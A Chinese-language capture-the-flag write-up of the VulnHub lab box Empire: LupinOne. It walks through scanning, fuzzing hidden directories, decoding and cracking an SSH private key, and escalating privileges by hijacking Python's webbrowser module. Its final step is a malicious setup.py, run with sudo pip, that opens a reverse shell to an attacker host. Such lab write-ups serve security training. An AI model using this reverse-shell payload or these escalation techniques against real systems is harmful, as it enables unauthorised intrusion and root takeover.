@@ -1,0 +1,424 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HfTsfpJ9w1Q7ZRA63g6rOg)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/ZSH4VlHv0wUiapfR49hWa2eYqkEGbXzkuQ59LbkL2CvAM8l6ZgoEquXibP2LqGdBhxIemS84Jl7iaVqDK9CJXVdCw/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/yy4ERibNaTfR1a65O0rmnQbpic6doaYJJDItNsfQWUBHsSJxn4TiaWOOnaB9CBdo2L7YUk8g2UpelUrQORCeDHHbw/640?wx_fmt=png)
+
+**声明：**文章来自作者日常学习笔记，请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。仅供学习研究
+
+![](https://mmbiz.qpic.cn/mmbiz_png/h6R0sRed4WF1Y7qVdRo7SibsRyCm88BjClJeIRVfaBH4LP84hq6VjWz5JKiadnZcuqTUwCVcHoSHlWr6o4X24Oxg/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/HIvUXxmO2Igh1vy0Tiayxpn8jT7aGK2bPrl3vib0GUP2bnEpNQz2HB37ic3E1HX3mNjyDOqAP15IHgGibZZxtib5VhA/640?wx_fmt=png)
+
+  
+
+    Tip: 有小伙伴留言说 vulnhub 的靶机 IP 如何修改, 其实 vulnhub 的靶机不需要改 IP 地址, 他的 IP 都是自动获取的.
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+**靶机信息**
+
+  
+
+  
+
+下载地址:  
+
+```
+https://www.vulnhub.com/entry/empire-lupinone,750/
+```
+
+难度: 中等  
+
+上架时间: 2021 年 10 月 21 日
+
+提示信息:
+
+This box was created to be medium, but it can be hard if you get lost.  
+CTF like box. You have to enumerate as much as you can.  
+For hints discord Server (https://discord.gg/7asvAhCEhe)
+
+  
+
+  
+
+**信息收集**
+
+  
+
+  
+
+### **扫描主机**
+
+```
+nmap -sP 192.168.7.1/24
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVTh4VcDwK6weibXicjmPoln65SHV9cgAHOaAN2mokwNQg5q47hDAFBQftMQ/640?wx_fmt=png)
+
+### **扫描端口**
+
+```
+nmap -sC -sV -p- 192.168.7.245 -oN LupinOne.nmap
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThyuouVKaOo8jltqDj1ibZHrcHWrkLYJC5y5bFEpvGC58WUYcIeUlK6Wg/640?wx_fmt=png)
+
+开放 22 和 80 端口, 先访问 80 看看
+
+  
+
+  
+
+**WEB 渗透**
+
+  
+
+  
+
+看到一个静态页面, 注释中有一段话, Its an easy box, dont give up. 提示这是一个简单的靶机, 不要放弃. 没什么有用的信息那就目录扫描吧
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThGAQOYUOqwaJdhCFLrEqe3VMCe6G3whC702NT8vQnzLMbkiaakPux0KA/640?wx_fmt=png)
+
+### **目录扫描**
+
+```
+gobuster dir -w ../../../Dict/SecLists-2021.4/Discovery/Web-Content/big.txt -u http://192.168.7.245
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThmwq0u9mtMtEn21hTEAkpRyyyUFIJXCqQLBRkTxwcZRicZTMVw7mY3RA/640?wx_fmt=png)
+
+扫到 robots.txt 文件 (其实 nmap 扫描端口时已经提示了, 只是当时有只奥特曼飞过闪到我的眼睛), 打开找到~ myfiles 目录
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVTh4baXib9buiaOnicszBx87vCqvlmePTRiamP69bj090GHCEvh7uCuVhlIEg/640?wx_fmt=png)
+
+访问后显示错误 404, 查看代码发现一段提示 "Your can do it, keep trying.", 没什么用处
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThAhKOQq22s5mop7HVtovWyLhfyDCiacC7slukRkDeF7oxMd0G5MiaQdvw/640?wx_fmt=png)
+
+**模糊测试**
+
+但是这个 404 不是服务器返回的, 而是页面就是这个提示, 感觉需要加参数访问
+
+```
+wfuzz -c -w ../../../Dict/fuzzdb-master/discovery/predictable-filepaths/filename-dirname-bruteforce/upload_variants.txt -u http://192.168.7.245/~myfiles/?FUZZ=a
+```
+
+尝试了一堆字典后我放弃, 还是要重目录扫描入手, 想到既然有一个~ myfiles 目录会不会有其它目录也是~ 开头的, 试试看
+
+```
+wfuzz -c -w ../../../Dict/SecLists-2021.4/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.7.245/~FUZZ |grep -v 404
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThcnSTSeHZ90yURCLLtumib1SneomsLCUx6lEaDSncDnM6AGlVAhfv10g/640?wx_fmt=png)
+
+果然猜对了扫到~ secret 目录, 看下里面有什么吧
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThERlicTz3tTbZBP3bgezK53Q0VOukh5M4S0lR3HkZl9ibLVWGBTBaBTMA/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVTh5rI3DqHxf8iaE1Sic431R9GWfG4k6hQ4pUDtS9rM1PISicew6icz0ahasQ/640?wx_fmt=png)
+
+提示我们找到了一个秘密目录, 里面有私钥文件, 还是个隐藏文件, 需要用 fasttrack 破解密码在打其它靶机时有用过这个字典文件, 还提到 icex64 是朋友那应该就是帐号了
+
+那我们继续扫私钥文件吧
+
+```
+wfuzz -c -w ../../../Dict/SecLists-2021.4/Discovery/Web-Content/directory-list-2.3-medium.txt -w ../../../Dict/SecLists-2021.4/Fuzzing/extensions-skipfish.fuzz.txt -u http://192.168.7.245/~secret/.FUZZ.FUZ2Z
+```
+
+这里说一下 wfuzz 太吃内存了, 我不得不改用 burpsuite, 如果哪位大佬有好的模糊测试工具请推荐一下
+
+### **BurpSuite**
+
+定义 2 个参数位置
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThOuKuJGS0D2icWWveLMJbqP04suf95m0icABDN69F5a2Iib9QKC4d7HCsw/640?wx_fmt=png)
+
+Payload1
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThzMKkQiaFAZxZ1iahXuT6KksHstKKJVGRN9myGPkYlAepHwHXibccibBic2A/640?wx_fmt=png)
+
+Payload2
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThz7icTZtNIl526MqpIs5xxS2QUt4pIUAVM3JygvWIAVb5iaO6kOHINxqw/640?wx_fmt=png)
+
+成功暴破到文件. mysecret.txt
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThvmWeR3jpaAmcy88FpJ69BpDn4UsIwQviaYxQYDicLeYRqiciaia9v9e4xMA/640?wx_fmt=png)
+
+  
+
+  
+
+**base58 解密**
+
+  
+
+  
+
+访问后拿到一大串加密内容, 看起来像 base64 加密过的
+
+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
+
+base64 解不出, 还得找找
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVTh4KSichr0Qmqlbhbktac5RRs1QFzuicYmNZt1179OOpwwRJa9wlA6Km5w/640?wx_fmt=png)
+
+在群里问了一下, 有大佬推荐 decode.fr 这个站点可以识别加密
+
+**检测地址:**
+
+```
+https://www.dcode.fr/identification-chiffrement
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThYIficXEicQLYpib9aOia3WeibkJl6I6zkUkySMWzNbelxtztaVZAwoTOgCg/640?wx_fmt=png)
+
+这里显示 base58 的可能性最大
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThicNJzAAic2Zo6VXSntxbicpic1HpB61daoApTZ7Sx2dlGUeK9sYD2tysjA/640?wx_fmt=png)
+
+解出来了, 一个证书
+
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+iUJ66WmRUN9EoVlkeCzQJwivI=
+-----END OPENSSH PRIVATE KEY-----
+```
+
+将他保存为私钥 id_rsa 文件, 准备好后我们就可以破解了
+
+  
+
+  
+
+**暴破密码**
+
+  
+
+  
+
+### **使用 john 暴破**
+
+```
+python3 /usr/share/john/ssh2john.py id_rsa >crack.txt
+john crack.txt --wordlist=/usr/share/wordlists/fasttrack.txt
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThcL67cgibxd28ZBA1C1icXFzDSKUibvN6xicfyibm6icjnr84jKjdGjLE4j7Q/640?wx_fmt=png)
+
+拿到密码 P@55w0rd! 登陆 ssh, 用之前的提示 icex64 做为帐号
+
+```
+cp id_rsa ~/.ssh/
+chmod 600 ~/.ssh/id_rsa
+ssh -i ~/.ssh/id_rsa icex64@192.168.7.245
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThklCzW0n7ibtVtfxNh3S9WB7jkicbib6CnibwCrAfs3HRiaRytiaSQiaVlwzMA/640?wx_fmt=png)
+
+登陆成功, 目录下有个 user.txt 打开后拿到用户 flag
+
+```
+ls
+cat user.txt
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThAQ0t46icM1XBBaAK2v2h7fcV7Knq6lEFCfK50JPZgicFEhEg2fOXb4wA/640?wx_fmt=png)
+
+试着找找可提权的文件
+
+```
+sudo -l
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThAvm77ia7mUmbXtrVf2SfVByWhgDgTDAFdts4Jm0dFhtEpy1twFOMEoA/640?wx_fmt=png)
+
+找到一个 python 脚本, 使用 arsene 权限执行不需要密码, 这个可以利用
+
+看一下 arsene 目录下还有什么
+
+```
+cd /home/arsene
+ls
+cat note.txt
+```
+
+找到一段提示, 说的秘密文件应该就是 heist.py 脚本
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVTh5miaRbSI9EuMciargrrmzIY8icfPHvruKkIK65vHAMY3r0ciaiao47WWa3Q/640?wx_fmt=png)
+
+  
+
+  
+
+**权限提升**
+
+  
+
+  
+
+分析一下 heist.py 脚本的内容, 这里引入 webbrowser 包, 我们找一下这个包在哪
+
+```
+python3 -c 'import sys;print(sys.path)'
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThlxRZ8JLwm8IUBt9WSyXMePJ1kT8041ULMaiaCEP8fu33YUCfOmNouHg/640?wx_fmt=png)
+
+找到目录, 进去看看 webbrowser 是什么
+
+```
+cd /usr/lib/python3.9
+ls webbrowser.py
+vi webbrowser.py
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThJhVI3OKmv3TSPULobuVX56x3l1EEv8ZlRicjTFmMTTFOjv9B3YMnXgw/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThHmGlH80f1sxibKqS3YcHia2a3cczpmQm1Iibw0Wib2qNz805GsGuKxicGrg/640?wx_fmt=png)
+
+插段提权代码进去
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThBKwhsiaTYwpDKIuuxRMTTThes7q7sdsWlVLr0ibjrrmKVbCUzEbflVyw/640?wx_fmt=png)
+
+开始提权
+
+```
+sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVTh19jqapKjmnMd31sictgicxPRpMfbmjfkFTDBzYW0Mz90nVcuRSAKtM2g/640?wx_fmt=png)
+
+拿到 arsene 的权限, 继续提权到 root
+
+```
+sudo -l
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThRBV0lktaP5l3pQntLl7bic3S0xkf3PsaW2ytmfQHvyice9EZGSNGDQmA/640?wx_fmt=png)
+
+发现 pip 执行 root 权限不需要密码, pip 执行时会调用 setup.py 脚本
+
+我们在当前目录下创建个恶意 setup.py 脚本用来反弹 shell 并提权
+
+```
+vi setup.py
+```
+
+```
+from setuptools import setup
+from setuptools.command.install import install
+import os, socket, subprocess
+
+class CustomInstall(install):
+  def run(self):
+    install.run(self)
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("192.168.7.3",4444))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p=subprocess.call(["/bin/sh","-i"])
+
+setup(name='FakePip',
+      version='0.0.1',
+      description='Reverse shell',
+      url='xx.xx.xx.xx',
+      author='nathan',
+      author_email='xx@xx',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
+```
+
+创建好脚本后, 在 kali 攻击机上监听 4444 端口
+
+```
+nc -lvvp 4444
+```
+
+再到靶机上执行提权
+
+```
+sudo pip install . --upgrade
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVTh8anXgLallTngttO4tZDm7Gy3yH9yicPSycKKLpy5uvVRsrsibjvfjVKA/640?wx_fmt=png)
+
+切换到 root 目录查看文件
+
+```
+cd /root
+ls
+cat root.txt
+```
+
+![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUv6MYEmtibtZ3IMXWs7UOVThtvWtQiawMO4vm5yIt4LnC9V5ia0hV6JSfyG6PmT2tnaqOUAVbSjts6WQ/640?wx_fmt=png)
+
+拿到 root 权限 flag, 结束.
+
